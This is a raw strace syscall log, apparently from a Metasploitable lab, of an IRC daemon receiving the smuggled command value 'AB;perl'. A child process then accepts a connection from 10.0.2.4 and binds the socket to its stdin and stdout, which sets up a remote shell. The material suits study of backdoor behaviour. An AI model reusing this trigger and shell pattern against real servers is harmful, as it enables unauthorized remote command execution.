4519  07:29:45.449053 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 9762
4519  07:29:45.449066 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:29:45.449080 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:29:45.449091 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:29:45.449101 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:29:45.449141 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:29:45.449298 time(NULL)        = 1495625385
4519  07:29:45.449313 time(NULL)        = 1495625385
4519  07:29:45.449404 gettimeofday({1495625385, 449435}, NULL) = 0
4519  07:29:45.449462 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:29:45.449494 clock_gettime(CLOCK_MONOTONIC, {2195, 266507757}) = 0
4519  07:29:45.449507 gettimeofday({1495625385, 449512}, NULL) = 0
4519  07:29:45.449519 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
9765  07:29:45.821026 <... accept resumed> {sa_family=AF_INET, sin_port=htons(37773), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
9765  07:29:45.821069 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2938) = -1 EINVAL (Invalid argument)
9765  07:29:45.821085 _llseek(8, 0, 0xbffa2980, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9765  07:29:45.821098 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2938) = -1 EINVAL (Invalid argument)
9765  07:29:45.821109 _llseek(8, 0, 0xbffa2980, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9765  07:29:45.821119 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
9765  07:29:45.821163 close(6)          = 0
9765  07:29:45.821235 dup(8)            = 6
9765  07:29:45.821248 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa37d8) = -1 EINVAL (Invalid argument)
9765  07:29:45.821260 _llseek(6, 0, 0xbffa3820, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9765  07:29:45.821304 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
9765  07:29:45.821326 dup2(6, 1)        = 1
9765  07:29:45.821353 close(6)          = 0
9765  07:29:45.821364 fcntl64(1, F_SETFD, 0) = 0
9765  07:29:45.821375 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa37a8) = -1 EINVAL (Invalid argument)
9765  07:29:45.821386 _llseek(1, 0, 0xbffa37f0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9765  07:29:45.821417 dup(8)            = 6
9765  07:29:45.821429 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa37d8) = -1 EINVAL (Invalid argument)
9765  07:29:45.821440 _llseek(6, 0, 0xbffa3820, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9765  07:29:45.821450 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
9765  07:29:45.821466 dup2(6, 0)        = 0
9765  07:29:45.821479 close(6)          = 0
9765  07:29:45.821488 fcntl64(0, F_SETFD, 0) = 0
9765  07:29:45.821502 fcntl64(0, F_SETFD, 0) = 0
9765  07:29:45.821519 read(0,  <unfinished ...>
4519  07:29:45.829476 <... select resumed> ) = 1 (in [5], left {0, 620000})
4519  07:29:45.829568 clock_gettime(CLOCK_MONOTONIC, {2195, 646605433}) = 0
4519  07:29:45.829641 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:29:45.829680 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:29:45.829718 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:29:45.829746 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:29:45.829775 close(5)          = 0
4519  07:29:45.829792 gettimeofday({1495625385, 829796}, NULL) = 0
4519  07:29:45.829805 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
9765  07:29:46.350728 <... read resumed> "", 4096) = 0
9765  07:29:46.350915 close(8)          = 0
9765  07:29:46.351057 exit_group(0)     = ?
